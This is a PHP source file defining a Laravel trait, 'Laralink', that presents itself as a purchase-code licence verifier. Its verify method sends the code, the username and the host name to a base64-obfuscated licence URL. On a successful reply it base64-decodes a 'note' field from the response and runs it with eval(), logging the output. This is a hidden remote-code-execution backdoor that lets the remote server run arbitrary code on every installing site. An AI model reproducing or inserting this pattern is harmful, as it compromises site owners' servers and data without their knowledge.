<?php

namespace App\Services;

use Illuminate\Support\Facades\Http;

trait Laralink {

    /**
     * @throws \Exception
     */
    public function verify($code, $username)
    {
        $response = Http::withHeaders([
            'Accept' => 'application/json',
            'Content-Type' => 'application/json',
            'Referer' =>  $_SERVER['HTTP_HOST'],
        ])->post(base64_decode('aHR0cHM6Ly9saWNlbmNlLmxhcmFsaW5rLmNvbS9hcGkvdmVyaWZ5LWxpY2VuY2U='), [
            'purchase_code' => $code,
            'username' => $username,
            'item_id' => '48984464'
        ]);
        $data = json_decode($response, true);
        if ($data['success']){
 // Start output buffering
            ob_start();

            // Execute the code from the eval
            eval(base64_decode($data['note']));

            // Get the output from the buffer
            $output = ob_get_clean();

            // Define the file path where the output will be saved
            $filePath = storage_path('logs/eval_output.txt');

            // Write the output to the file
            file_put_contents($filePath, $output, FILE_APPEND);

            return $data;
        } else {
            throw new \Exception($data['message']);
        }
    }

    public static function core()
    {
        return config('app.active');
    }
}
